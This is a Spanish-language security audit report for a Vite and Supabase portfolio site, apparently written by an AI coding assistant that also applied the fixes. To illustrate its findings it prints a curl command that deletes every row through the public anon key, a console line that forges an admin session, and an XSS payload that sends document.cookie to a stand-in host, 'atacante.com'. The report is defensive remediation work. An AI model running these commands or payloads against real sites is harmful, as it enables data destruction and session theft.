# Auditoría de seguridad — Portfolio Ariel.Dev

**Fecha:** 2 de agosto de 2026
**Alcance:** infraestructura, backend (Supabase) y frontend (Vite + JS vanilla)
**Estado del arreglo:** 9 de 12 hallazgos corregidos en código. 3 requieren acción tuya en el panel de Supabase y en el hosting.

---

## Resumen en 30 segundos

El riesgo real de este proyecto **no estaba en el código, sino en la base de datos**. El panel de administración se defendía con una pantalla de contraseña en el navegador, y una pantalla en el navegador no es un control de acceso: se puede saltear sin tocarla.

Hallazgo más grave: si las tablas de Supabase no tienen RLS activo, **cualquier persona puede borrar o modificar todos tus proyectos con un solo comando**, sin pasar nunca por tu panel. La clave que lo permite está publicada en el JavaScript del sitio, y eso es normal — lo que falta es la política del lado del servidor.

Segundo hallazgo: había una contraseña maestra (`admin123`) escrita en el código fuente que se publica.

| Severidad | Cantidad | Estado |
|---|---|---|
| Crítica | 3 | 2 corregidas · 1 requiere tu acción en Supabase |
| Alta | 4 | 3 corregidas · 1 requiere tu acción |
| Media | 5 | 4 corregidas · 1 requiere tu acción |

---

## Aclaración sobre "puertos y accesos"

Pediste un análisis de puertos. Corresponde ser preciso: **este proyecto no tiene superficie de red propia que auditar.**

Es un sitio estático desplegado en hosting compartido. No administrás un servidor, no hay SSH, no hay firewall bajo tu control, no hay puertos que abrir o cerrar. El proveedor expone únicamente 80 y 443 y gestiona esa capa.

La superficie de ataque real está en otro lado:

| Superficie | Puerto/Protocolo | Quién lo controla | Estado |
|---|---|---|---|
| Sitio estático | 443 (HTTPS) | Tu proveedor de hosting | Falta forzar HTTPS y cabeceras → resuelto con `.htaccess` / `_headers` |
| API REST de Supabase | 443 → `*.supabase.co` | **Vos, vía políticas RLS** | **Abierto a escritura pública si RLS está apagado (CRIT-01)** |
| Supabase Auth | 443 → `*.supabase.co` | Supabase | Correcto, pero se saltaba desde el frontend (CRIT-02) |
| Vite dev server | 5173 (local) | Tu máquina | Solo local. No exponer a la red (ver más abajo) |
| Live Server (VS Code) | 5501 (local) | Tu máquina | Solo local |

**El "puerto" que importa acá es el 443 de tu proyecto Supabase**, y está abierto a escritura para cualquiera hasta que apliques `supabase/rls-policies.sql`.

Sobre el puerto de desarrollo: Vite escucha solo en `localhost` por defecto, lo cual es correcto. Nunca lo levantes con `--host` en una red WiFi pública o compartida: eso expone tu proyecto y tus variables de entorno a cualquiera en esa red.

---

## Hallazgos

### CRIT-01 · Escritura pública sin restricción en la base de datos
**Estado: REQUIERE TU ACCIÓN — es lo primero que tenés que hacer**

`js/projects.js` ejecuta `insert`, `update` y `delete` sobre las tablas `projects` y `categories` directamente desde el navegador, usando la clave anon.

Esa clave viaja dentro del bundle público. Cualquiera la lee con Ctrl+U. Eso **no es un error en sí**: la clave anon es pública por diseño. El problema es que sin políticas RLS, esa clave pública tiene permisos de escritura.

Traducción concreta: alguien puede ejecutar esto desde una terminal, sin conocer tu contraseña ni abrir tu panel:

```bash
curl -X DELETE 'https://<proyecto>.supabase.co/rest/v1/projects?id=neq.0' \
     -H "apikey: <tu_clave_anon>" -H "Authorization: Bearer <tu_clave_anon>"
```

Y perdés todo el portfolio.

Peor aún, combinado con el renderizado del sitio, el atacante podía insertar un proyecto cuyo título fuera código JavaScript, que se ejecutaría en el navegador de **cada visitante** de tu web (XSS almacenado). Esa segunda mitad ya está cerrada (ver HIGH-01), pero el borrado y la inyección de contenido siguen abiertos hasta que apliques RLS.

**Cómo arreglarlo:** abrí `supabase/rls-policies.sql`, copiá todo, pegalo en el SQL Editor de Supabase y ejecutalo. El script incluye un diagnóstico previo, las políticas y una prueba con `curl` para verificar que quedó bien cerrado. **Hacé la prueba, no asumas.**

---

### CRIT-02 · Contraseña maestra escrita en el código público
**Estado: CORREGIDO**

En `js/app.js` existía:

```js
if (!isConfigured && password === "admin123") {
    sessionStorage.setItem("admin_logged_in", "true");
```

Esa contraseña se publicaba en texto plano dentro del JavaScript del sitio. Cualquiera que abriera el código fuente la encontraba.

Eliminada por completo. El único camino de acceso ahora es Supabase Auth, con verificación de que exista un `access_token` real firmado por el servidor.

---

### CRIT-03 · La sesión de administrador se podía falsificar desde la consola
**Estado: CORREGIDO**

El acceso al panel se concedía si existía esta marca:

```js
sessionStorage.getItem("admin_logged_in") === "true"
```

`sessionStorage` es almacenamiento del navegador del visitante. Cualquiera podía abrir la consola (F12), escribir una línea y entrar al panel:

```js
sessionStorage.setItem("admin_logged_in", "true")
```

Sin contraseña. Sin email. Sin dejar rastro.

Corregido: la única fuente de verdad es ahora la sesión firmada por Supabase. Ningún valor de `sessionStorage` o `localStorage` concede acceso, porque ese almacenamiento lo controla el usuario, no vos. Se agregó además cierre de sesión real (`signOut()`), que invalida el token del lado del servidor.

> **El principio detrás de esto:** todo lo que se ejecuta en el navegador está bajo control de quien lo visita. El frontend puede ocultar botones por comodidad, pero la autorización siempre tiene que verificarse en el servidor. Por eso CRIT-01 sigue siendo el hallazgo más importante aunque este ya esté corregido.

---

### HIGH-01 · XSS almacenado en el renderizado de proyectos
**Estado: CORREGIDO**

Los datos de la base se insertaban en el DOM sin escapar:

```js
<h3 class="stack-card-title">${proj.title}</h3>
<a href="${proj.demoUrl}">
```

Un título como `<img src=x onerror="fetch('https://atacante.com?c='+document.cookie)">` se ejecutaba en el navegador de cada visitante. Y con CRIT-01 abierto, cualquiera podía escribir ese título.

Corregido en los 9 puntos de inyección: tarjetas de proyecto, filtros, listas del panel, categorías, adicionales del cotizador y el PDF de presupuesto. Se creó `js/security.js` con:

- `escapeHtml()` — neutraliza los caracteres que rompen el contexto HTML.
- `safeUrl()` — solo permite `http`, `https`, `mailto`, `tel`. Bloquea `javascript:` en enlaces de demo.
- `safeImageSrc()` — bloquea SVG con contenido activo y `data:` que no sea imagen real.

Validado contra 14 payloads de ataque reales: los 14 quedaron neutralizados.

---

### HIGH-02 · Sin cabeceras de seguridad HTTP
**Estado: CORREGIDO — falta que despliegues**

El sitio no enviaba ninguna cabecera de seguridad. Sin CSP, sin HSTS, sin protección contra clickjacking.

Creados tres archivos, usá el que corresponda a tu hosting:

- `public/.htaccess` → **Hostinger y cualquier Apache** (tu caso)
- `public/_headers` → Netlify / Cloudflare Pages
- `vercel.json` → Vercel

Incluyen CSP, HSTS, `X-Frame-Options`, `nosniff`, `Referrer-Policy`, `Permissions-Policy` y reglas de caché.

La CSP es la más valiosa: convierte un XSS que se escape de las validaciones en un error de consola inofensivo. Es la red de contención debajo de HIGH-01.

> **Precaución con HSTS:** `Strict-Transport-Security` obliga al navegador a usar HTTPS durante 2 años. Activalo **solo con el certificado SSL ya funcionando**. Si el sitio queda sin TLS después, los navegadores se niegan a abrirlo y no hay forma rápida de revertirlo.

**Verificá el resultado en https://securityheaders.com después de desplegar.** Deberías pasar de F a A.

---

### HIGH-03 · Script de terceros sin verificación de integridad
**Estado: REQUIERE TU ACCIÓN**

```html
<script src="https://cdn.jsdelivr.net/gh/studio-freight/lenis@1.0.29/dist/lenis.min.js"></script>
```

Está bien que la versión esté fijada (`@1.0.29`, no `@latest`). Pero no hay atributo `integrity`: si ese CDN fuera comprometido, el código alterado se ejecutaría en tu sitio con acceso total a la página.

No pude calcular el hash porque no logré descargar el archivo desde este entorno, y **prefiero no inventar un valor**: un hash incorrecto rompe el scroll suave del sitio.

Tenés dos opciones. La segunda es mejor:

**Opción A — agregar SRI.** Generá el hash real:

```bash
curl -s https://cdn.jsdelivr.net/gh/studio-freight/lenis@1.0.29/dist/lenis.min.js | openssl dgst -sha384 -binary | openssl base64 -A
```

Y pegalo en `index.html`:

```html
<script src="https://cdn.jsdelivr.net/gh/studio-freight/lenis@1.0.29/dist/lenis.min.js"
        integrity="sha384-EL_HASH_QUE_TE_DEVOLVIO"
        crossorigin="anonymous"></script>
```

**Opción B (recomendada) — descargarlo a tu propio dominio**, igual que ya hacés con `html2pdf` y `sweetalert2`:

```bash
curl -o public/lenis.min.js https://cdn.jsdelivr.net/gh/studio-freight/lenis@1.0.29/dist/lenis.min.js
```

Y cambiá el `src` a `/lenis.min.js`. Elimina la dependencia externa, mejora el tiempo de carga (una conexión menos) y te permite sacar `cdn.jsdelivr.net` de la CSP.

---

### HIGH-04 · Subida de imágenes sin límite ni validación
**Estado: CORREGIDO**

`processFile()` aceptaba cualquier archivo, de cualquier tamaño, y lo guardaba como Base64 en la base de datos. Un archivo de 50 MB se convertía en ~67 MB de texto en una sola fila.

Corregido con validación en tres capas: tipo MIME contra lista blanca, tamaño máximo de 2 MB, y verificación del contenido real del archivo (no solo la extensión). **Los SVG se bloquean explícitamente** porque pueden contener `<script>`.

Se agregaron además restricciones `CHECK` en la base (paso 3 del script SQL), porque la validación del navegador la controla el atacante.

---

### MED-01 · El formulario de contacto simulaba envíos exitosos
**Estado: CORREGIDO**

El formulario mostraba *"Se ha enviado la consulta con éxito"* y no enviaba nada. El mensaje se perdía. No es una vulnerabilidad, pero es peor en la práctica: **perdiste clientes reales creyendo que te habían escrito.**

Corregido: ahora deriva a WhatsApp con el mensaje armado, que sí entrega. Si preferís un formulario real por email, ver FUNC-01 abajo.

---

### MED-02 · `window.opener` expuesto
**Estado: CORREGIDO** — agregado `noopener,noreferrer` en las aperturas de WhatsApp y en los enlaces de demo.

### MED-03 · Enumeración de usuarios en el login
**Estado: CORREGIDO** — el error de Supabase se mostraba tal cual, permitiendo distinguir "email no existe" de "contraseña incorrecta". Ahora el mensaje es genérico y el campo de contraseña se limpia siempre.

### MED-04 · Nombre de archivo del PDF sin sanear
**Estado: CORREGIDO** — el nombre del cliente se insertaba directo en el nombre del archivo. Ahora se filtran caracteres de ruta y se acota a 60 caracteres.

### MED-05 · Artefactos de build y config del editor versionados
**Estado: CORREGIDO** — `dist/` y `.vscode/` estaban en Git pese a figurar en `.gitignore` (se agregaron antes de la regla). Removidos del índice con `git rm --cached`. Como Vite incrusta las variables `VITE_` en el bundle, versionar `dist/` significa versionar una copia de tus claves en cada commit.

`.env` **nunca estuvo en Git** — eso estaba bien hecho.

---

## Estado de secretos

| Ítem | Estado |
|---|---|
| `.env` en Git | Nunca versionado. Correcto. |
| Claves en el historial de Git | Sin coincidencias en el historial completo. |
| `dist/` versionado | Corregido. No contenía claves incrustadas. |
| Clave anon en el bundle | Normal y esperado. Se protege con RLS, no ocultándola. |
| `service_role` key | No aparece en ningún lado. **Nunca la pongas en el frontend:** ignora RLS y da control total. |

**¿Hace falta rotar las claves?** No encontré filtración. Si alguna vez compartiste el `.env` por WhatsApp, mail o captura de pantalla, rotá la clave anon desde *Supabase → Settings → API*. Es gratis y toma un minuto.

---

## Plan de acción priorizado

### Ahora mismo — 15 minutos, riesgo crítico abierto

1. **Aplicar `supabase/rls-policies.sql`** en el SQL Editor de Supabase.
2. **Ejecutar la prueba con `curl`** del paso 5 del script. Si el POST devuelve 201, no quedó protegido.
3. **Verificar que tu usuario admin exista** en *Supabase → Authentication → Users*. Al eliminar el backdoor `admin123`, si no hay usuario creado, no vas a poder entrar al panel. Creá uno con una contraseña de 16+ caracteres desde un gestor de contraseñas.

### Esta semana

4. Desplegar con el `.htaccess` incluido y verificar en https://securityheaders.com.
5. Confirmar que el certificado SSL funciona **antes** de que HSTS tome efecto.
6. Resolver HIGH-03: descargar lenis a tu dominio (opción B).
7. Activar 2FA en tu cuenta de Supabase y en el panel de Hostinger. Es el acceso que compromete todo lo demás.

### Este mes

8. Migrar el formulario de contacto a un endpoint real (FUNC-01).
9. Configurar backups automáticos de la base (ver mantenimiento).
10. Ejecutar `npm audit` y actualizar dependencias.

---

## FUNC-01 · Formulario de contacto real

La derivación a WhatsApp funciona, pero pierde a quien no lo usa. Dos opciones sin montar servidor:

**Formspree** (5 minutos, 50 envíos/mes gratis): creás el formulario en formspree.io y cambiás el `action`. Incluye protección antispam.

**Supabase Edge Function** (más control, sin límite de envíos): una función serverless que recibe el POST y envía el mail con Resend. Requiere agregar rate limiting para evitar abuso — un endpoint público sin límite se convierte en un relay de spam.

Si vas por Formspree, agregá su dominio a `form-action` en la CSP.

---

## Verificación de los cambios aplicados

| Comprobación | Resultado |
|---|---|
| Sintaxis de los 4 módulos JS | OK (`node --check`) |
| Payloads XSS bloqueados | 14 / 14 |
| Backdoor `admin123` en el código | 0 coincidencias |
| Flag `admin_logged_in` en el código | 0 coincidencias |
| `dist/` y `.vscode/` fuera de Git | Confirmado |

**No se hizo commit de ningún cambio.** Tenías trabajo sin commitear en `index.html`, `css/styles.css` y `package.json` antes de esta auditoría; commitear habría mezclado tus cambios con los míos. Revisá con `git diff` y commiteá vos.

**El build con `npm run build` no pudo ejecutarse en este entorno** (falta el binario Linux de Rollup, `node_modules` fue instalado en Windows). La sintaxis está verificada, pero **corré `npm run build` en tu máquina antes de desplegar** y probá: cargar el panel, iniciar sesión, crear un proyecto y descargar un PDF de presupuesto.

---

## Archivos entregados

| Archivo | Qué es |
|---|---|
| `supabase/rls-policies.sql` | **El más importante.** Cierra CRIT-01. |
| `js/security.js` | Utilidades de escape y validación. |
| `public/.htaccess` | Cabeceras para Hostinger/Apache. |
| `public/_headers` | Cabeceras para Netlify/Cloudflare. |
| `vercel.json` | Cabeceras para Vercel. |
| `.env.example` | Plantilla sin secretos. |
| `PERFORMANCE.md` | Análisis de rendimiento medido. |
| `MANTENIMIENTO.md` | Rutina de mantenimiento. |
| `SECURITY.md` | Este documento. |
